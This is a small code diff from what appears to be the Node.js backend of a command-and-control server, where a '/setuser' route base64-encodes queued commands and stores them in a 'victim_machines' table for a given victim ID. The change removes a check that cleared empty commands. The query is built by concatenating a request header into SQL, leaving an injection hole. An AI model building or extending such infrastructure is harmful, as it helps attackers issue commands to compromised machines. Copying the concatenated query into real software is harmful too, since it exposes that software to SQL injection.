@@ -72,9 +72,9 @@ app.get('/setuser', (req, res)=>{
 		let buff2 = new Buffer(JSON.stringify(json_commands));
 		let b64_final = buff2.toString('base64');
 
-		if (!Object.keys(json_commands).length) {
-			b64_final = "";
-		}
+		//if (!Object.keys(json_commands).length) {
+		//	b64_final = "";
+		//}
 
 		con.query("UPDATE victim_machines SET command = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
 			if (err) throw err;
